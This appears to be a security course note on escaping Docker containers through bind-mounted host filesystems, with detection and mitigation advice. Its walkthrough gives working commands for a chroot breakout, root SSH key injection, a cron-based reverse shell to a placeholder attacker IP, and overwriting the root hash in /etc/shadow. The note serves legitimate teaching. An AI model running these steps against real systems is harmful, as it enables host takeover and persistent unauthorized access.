---
tags: [docker, volume-mount, container-escape, filesystem, privilege-escalation]
difficulty: beginner
module: "38 - Container and Kubernetes Security"
topic: "38.05 Host FS Escape"
---

# 05 - Container Escape — Mounted Host Filesystem

## Introduction

One of the most foundational and frequently used features of Docker is the ability to persist data and share files between the host machine and the container. This is primarily achieved using Volume Mounts (or Bind Mounts). A bind mount maps a specific file or directory on the host machine to a directory inside the container's isolated filesystem.

While this is incredibly useful for providing configuration files, accessing persistent databases, or sharing logs, it becomes a critical security vulnerability when sensitive host directories are mapped into the container. If an attacker gains code execution inside a container that has access to critical host filesystems (such as `/`, `/etc`, `/root`, or `/var/log`), they can easily manipulate the host's configuration, plant backdoors, and achieve a full container escape resulting in complete host compromise.

This misconfiguration is notoriously common in logging agents (like Fluentd, Logstash, or Promtail) which require access to `/var/log` or the entire host filesystem to aggregate logs, and in management agents that require access to host configurations.

## The Mechanics of the Vulnerability

When a host directory is bind-mounted into a container, the container is essentially bypassing the Mount (MNT) namespace isolation for that specific directory. The kernel treats the mounted directory exactly as it exists on the physical host. Any modifications made to files within that mount inside the container are instantly reflected on the host system.

If the container process runs as `root` (which is the default behavior in Docker unless specifically configured otherwise via the `USER` directive), and the directory is mounted read-write (`rw`), the attacker can modify critical host files with host-level root privileges.

### Attack Architecture Diagram

```text
+----------------------------------------------------------------------------+
|                             HOST OPERATING SYSTEM                          |
|                                                                            |
|   +--------------------------------------------------------------------+   |
|   |                      VULNERABLE CONTAINER                          |   |
|   |                                                                    |   |
|   |  Attacker gains RCE                                                |   |
|   |        |                                                           |   |
|   |        v                                                           |   |
|   |  [ Bash Shell ]                                                    |   |
|   |        |                                                           |   |
|   |        +-----> Writes payload to /mnt/host/etc/crontab             |   |
|   |        +-----> Appends key to /mnt/host/root/.ssh/authorized_keys  |   |
|   |        +-----> Edits hash in /mnt/host/etc/shadow                  |   |
|   +--------------------------------------------------------------------+   |
|                                     |                                      |
|   Bind Mount (-v /:/mnt/host)       |  (Direct File I/O bypassing MNT)     |
|                                     v                                      |
|   +--------------------------------------------------------------------+   |
|   |                      HOST ROOT FILESYSTEM (/)                      |   |
|   |                                                                    |   |
|   |   /etc/crontab  <-- Payload executes on host as root via cron      |   |
|   |   /root/.ssh/   <-- Attacker SSH logs into host                    |   |
|   |   /etc/shadow   <-- Attacker modifies root password                |   |
|   +--------------------------------------------------------------------+   |
+----------------------------------------------------------------------------+
```

## Exploitation Walkthroughs

To exploit this, you first need to identify what host directories are available to you.

### Step 1: Reconnaissance Inside the Container

When you land a shell, inspect the mount points to see what is mapped from the host.

```bash
# Check current mounts
mount

# Look for suspicious directories (often mounted to /mnt, /host, /data, or /rootfs)
df -h
ls -la /mnt/host
```
If you see a full Linux root filesystem hierarchy (`bin`, `etc`, `home`, `root`, `var`) inside a subdirectory, you have likely hit the jackpot.

### Step 2: Exploitation Strategies

Depending on exactly what directories are mounted, several reliable paths to host compromise exist.

#### Technique A: Chroot Breakout (The Easiest Path)
If the absolute root of the host (`/`) is mounted (e.g., to `/mnt/host`), the simplest escape is to use the `chroot` command. This changes the apparent root directory for the current running process and its children to the mounted host directory.

```bash
chroot /mnt/host /bin/bash
```
*Result:* You are now operating entirely within the host's filesystem context. You can execute host binaries, access all host files natively, and manage host services.

#### Technique B: SSH Key Injection
If you cannot use `chroot` (e.g., the binary is missing) or only the `/root` directory is mounted, you can inject your public SSH key into the host's root user, allowing you to SSH directly into the host from the outside network.

```bash
# Generate an RSA key pair on your attacker machine
ssh-keygen -t rsa -b 4096

# Inside the container, create the .ssh directory if it doesn't exist
mkdir -p /mnt/host/root/.ssh
chmod 700 /mnt/host/root/.ssh

# Append your generated public key to authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc... attacker@kali" >> /mnt/host/root/.ssh/authorized_keys
chmod 600 /mnt/host/root/.ssh/authorized_keys
```
*Result:* You can now run `ssh root@<host_ip>` and gain direct access.

#### Technique C: Malicious Cron Jobs
If `/etc` or `/var/spool/cron` is mounted, you can schedule a reverse shell to be executed by the host's cron daemon. The cron daemon runs on the host and will execute the command with host root privileges.

```bash
# Append a reverse shell to the host's crontab
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/<attacker_ip>/4444 0>&1'" >> /mnt/host/etc/crontab
```
*Result:* Within 60 seconds, the host cron daemon will execute the reverse shell, calling back to your listener outside the container.

#### Technique D: Modifying Passwords
If `/etc` is mounted, you can simply add a new root-equivalent user to `/etc/passwd` or change the root password hash in `/etc/shadow`.

```bash
# Generate a password hash on attacker machine (e.g., password 'hacked')
openssl passwd -1 hacked
$1$xyz$hash...

# Edit the mounted shadow file and replace the root hash
sed -i 's/^root:[^:]*:/root:$1$xyz$hash...:/' /mnt/host/etc/shadow
```
*Result:* You can now `su root` from a lower privileged shell or SSH in with the password 'hacked'.

## Bypassing Read-Only Mounts

Administrators sometimes mount host directories as read-only (`-v /:/host:ro`) to prevent tampering. In standard containers, this prevents direct modification. However, if the container *also* possesses high capabilities (specifically `CAP_SYS_ADMIN`), it is entirely possible to remount the directory as read-write, bypassing the restriction.

```bash
# Attempt to remount the host directory as read-write
mount -o remount,rw /mnt/host
```
If successful, the protections are instantly bypassed, and the standard exploitation techniques discussed above apply.

## Detection and Mitigation

### Detection
- **File Integrity Monitoring (FIM):** Tools like OSSEC, AIDE, or Wazuh monitoring the host filesystem for unexpected changes to critical files like `/etc/crontab`, `/etc/shadow`, or `/root/.ssh/authorized_keys`.
- **SIEM Rules:** Correlate container lifecycle events with anomalous file creations on the host OS.

### Mitigation
1. **Principle of Least Privilege (Mounts):** Never mount the host's root (`/`), `/etc`, or `/var/run` directories unless absolutely unavoidable. Mount only the exact subdirectories or individual files required by the application.
2. **Enforce Read-Only:** Strictly use the `:ro` flag for bind mounts (`-v /config:/app/config:ro`) to ensure the container cannot alter host files. Monitor for capability additions that could bypass this.
3. **Rootless Containers:** Run the container process as a non-root user (using the `USER` directive in the Dockerfile). Even if a host directory is mounted rw, the non-root container user will be denied permission to write to sensitive host files owned by root.
4. **User Namespaces:** Enable Docker User Namespaces. This maps the `root` user inside the container to a high-numbered, unprivileged UID on the host. Thus, if the container attempts to edit `/mnt/host/etc/shadow` (owned by real host root UID 0), the operation will be denied by the kernel.

## Chaining Opportunities
- **Web App LFI -> RCE -> Escape:** Exploiting a Local File Inclusion (LFI) in a containerized app to gain shell access, discovering a mounted `/var/log` directory, and poisoning host logs or writing cron jobs to escape to the host.

## Related Notes
- [[01 - Docker Overview — Images, Containers, Registries]]
- [[04 - Container Escape — Privileged Container]]
